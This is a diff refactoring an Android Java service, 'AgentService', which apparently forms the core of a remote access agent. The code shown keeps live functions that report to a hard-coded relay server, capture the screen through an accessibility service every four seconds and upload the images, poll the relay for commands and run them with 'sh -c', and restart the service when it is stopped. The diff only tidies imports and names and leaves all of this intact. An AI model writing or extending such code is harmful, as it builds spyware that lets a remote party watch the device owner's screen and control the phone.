@@ -1,24 +1,39 @@
 package com.xusb.agent;
 
-import android.app.*;
-import android.content.*;
-import android.os.*;
+import android.app.AlarmManager;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.app.Service;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.os.Build;
+import android.os.IBinder;
 import android.util.Base64;
 import android.util.Log;
 import androidx.core.app.NotificationCompat;
 
-import org.json.*;
-import java.io.*;
-import java.net.*;
-import java.util.*;
-import java.util.concurrent.*;
+import org.json.JSONObject;
+
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
+import java.util.UUID;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
 
 public class AgentService extends Service {
 
-    static final String RELAY = "https://xusb-0c0p.onrender.com";
-    static final String TAG   = "XAgent";
+    static final String RELAY     = "https://xusb-0c0p.onrender.com";
+    static final String TAG       = "XAgent";
     static final String CHANNEL_ID = "xusb_agent";
-    static final String PREFS = "xusb_prefs";
+    static final String PREFS     = "xusb_prefs";
 
     private ExecutorService pool;
     private volatile boolean running = false;
@@ -55,14 +70,13 @@ public class AgentService extends Service {
         running = false;
         instance = null;
         super.onDestroy();
-        // Restart via alarm
         scheduleRestart();
     }
 
     // ── Core poll loop ──────────────────────────────────────────────────────────
 
     private void agentLoop() {
-        String did = getDeviceId();
+        String did = loadAgentId();
         long lastReg = 0, lastShot = 0;
         int lastCmdId = 0;
 
@@ -70,17 +84,14 @@ public class AgentService extends Service {
             try {
                 long now = System.currentTimeMillis();
 
-                // Heartbeat every 30s
                 if (now - lastReg > 30_000) {
                     register(did);
                     lastReg = now;
                 }
 
-                // Screenshot every 4s if accessibility enabled
                 if (now - lastShot > 4_000) {
                     AgentAccessibility acc = AgentAccessibility.getInstance();
                     if (acc != null) acc.requestShot();
-                    // If pendingShot was set by the callback, send it
                     byte[] shot = pendingShot;
                     if (shot != null) {
                         pendingShot = null;
@@ -89,15 +100,13 @@ public class AgentService extends Service {
                     lastShot = now;
                 }
 
-                // Poll for command
                 JSONObject p = getJson("/esp/device-cmd?did=" + URLEncoder.encode(did, "UTF-8"));
                 String cmd = p.optString("cmd", "");
-                int cid  = p.optInt("id", 0);
+                int cid    = p.optInt("id", 0);
                 if (!cmd.isEmpty() && cid != lastCmdId) {
                     lastCmdId = cid;
-                    final String finalCmd = cmd;
-                    final int finalCid = cid;
-                    pool.submit(() -> executeCmd(did, finalCmd));
+                    final String fc = cmd;
+                    pool.submit(() -> executeCmd(did, fc));
                 }
 
             } catch (Exception e) {
@@ -110,7 +119,7 @@ public class AgentService extends Service {
 
     // ── Device identity ─────────────────────────────────────────────────────────
 
-    private String getDeviceId() {
+    private String loadAgentId() {
         SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
         String did = prefs.getString("did", null);
         if (did == null) {
@@ -136,9 +145,7 @@ public class AgentService extends Service {
     // ── Execute shell command ───────────────────────────────────────────────────
 
     private void executeCmd(String did, String cmd) {
-        String out;
         if (cmd.equals("__uninstall__")) {
-            out = "Uninstalling...";
             try {
                 JSONObject body = new JSONObject();
                 body.put("did", did);
@@ -150,13 +157,14 @@ public class AgentService extends Service {
             stopSelf();
             return;
         }
+        String out;
         try {
-            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
+            // Use explicit java.lang.Process to avoid ambiguity with android.os.Process
+            java.lang.Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
             p.waitFor(30, TimeUnit.SECONDS);
             byte[] stdout = readStream(p.getInputStream(), 16384);
             byte[] stderr = readStream(p.getErrorStream(), 4096);
-            byte[] combined = concat(stdout, stderr);
-            out = Base64.encodeToString(combined, Base64.NO_WRAP);
+            out = Base64.encodeToString(concat(stdout, stderr), Base64.NO_WRAP);
         } catch (Exception e) {
             out = Base64.encodeToString(("Error: " + e.getMessage()).getBytes(), Base64.NO_WRAP);
         }
@@ -190,8 +198,7 @@ public class AgentService extends Service {
         c.setConnectTimeout(8000);
         c.setReadTimeout(8000);
         try {
-            byte[] body = readStream(c.getInputStream(), 65536);
-            return new JSONObject(new String(body));
+            return new JSONObject(new String(readStream(c.getInputStream(), 65536)));
         } finally { c.disconnect(); }
     }
 
@@ -212,8 +219,7 @@ public class AgentService extends Service {
 
     private byte[] readStream(InputStream is, int max) throws IOException {
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        byte[] buf = new byte[4096]; int n;
-        int total = 0;
+        byte[] buf = new byte[4096]; int n, total = 0;
         while ((n = is.read(buf)) != -1) {
             baos.write(buf, 0, n);
             total += n;
@@ -223,10 +229,10 @@ public class AgentService extends Service {
     }
 
     private byte[] concat(byte[] a, byte[] b) {
-        byte[] result = new byte[a.length + b.length];
-        System.arraycopy(a, 0, result, 0, a.length);
-        System.arraycopy(b, 0, result, a.length, b.length);
-        return result;
+        byte[] r = new byte[a.length + b.length];
+        System.arraycopy(a, 0, r, 0, a.length);
+        System.arraycopy(b, 0, r, a.length, b.length);
+        return r;
     }
 
     // ── Notification ────────────────────────────────────────────────────────────
